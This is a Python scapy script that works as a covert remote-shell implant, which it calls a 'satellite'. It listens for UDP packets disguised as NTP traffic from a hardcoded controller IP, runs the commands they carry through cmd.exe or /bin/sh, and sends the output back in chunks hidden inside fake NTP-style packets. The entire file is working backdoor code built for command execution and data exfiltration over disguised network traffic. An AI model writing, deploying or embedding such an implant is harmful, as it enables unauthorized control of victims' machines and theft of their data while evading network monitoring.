from scapy.all import *
import subprocess
import struct
import math
import time
import platform

SENDER_IP = "192.168.10.50"  # IP of the homebase
PORT = 54321
CHUNK_SIZE = 480  # Room for CHUNK header

def create_chunk(output, index, total):
    header = f"CHUNK {index}/{total}|".encode()
    chunk_data = output.encode()[index * CHUNK_SIZE:(index + 1) * CHUNK_SIZE]
    payload = header + chunk_data
    payload = payload.ljust(512, b"\x00")
    pkt = b"\x1b" + b"\x00" * 3 + struct.pack("!d", 0.0) * 2 + payload
    return IP(dst=SENDER_IP)/UDP(sport=PORT, dport=PORT)/Raw(load=pkt)

def run_command(command):
    try:
        system = platform.system()
        if system == "Windows":
            shell_cmd = ["cmd.exe", "/c", command]
        else:
            shell_cmd = ["/bin/sh", "-c", command]

        proc = subprocess.Popen(shell_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate(timeout=10)
        output = (out + err).decode(errors="ignore").strip()
        output = output.replace('\r', '').replace('\x1b', '')  # Clean up output
        return output
    except subprocess.TimeoutExpired:
        proc.kill()
        return "Command timed out."
    except Exception as e:
        return f"Error: {e}"

def handle_packet(packet):
    if packet.haslayer(UDP) and packet[UDP].dport == PORT:
        raw = bytes(packet[UDP].payload)
        command = raw[16:].replace(b"\x00", b"").decode(errors="ignore").strip()

        if command.startswith("CHUNK"):
            print("[!] Ignored reflected CHUNK packet.")
            return

        print(f"[+] Received command: {repr(command)}")

        output = "READY" if command == "READY" else run_command(command)

        print("[DEBUG] Full command output before chunking:")
        print(output)

        total_chunks = math.ceil(len(output.encode()) / CHUNK_SIZE)
        for i in range(total_chunks):
            pkt = create_chunk(output, i, total_chunks)
            for _ in range(2):  # Send each chunk twice for reliability
                send(pkt, verbose=False)
                time.sleep(0.1)
            print(f"[DEBUG] Sent CHUNK {i + 1}/{total_chunks} (x2)")

def main():
    print("[*] Satellite listening...")
    sniff(filter=f"udp and port {PORT} and src {SENDER_IP}", prn=handle_packet)

if __name__ == "__main__":
    main()
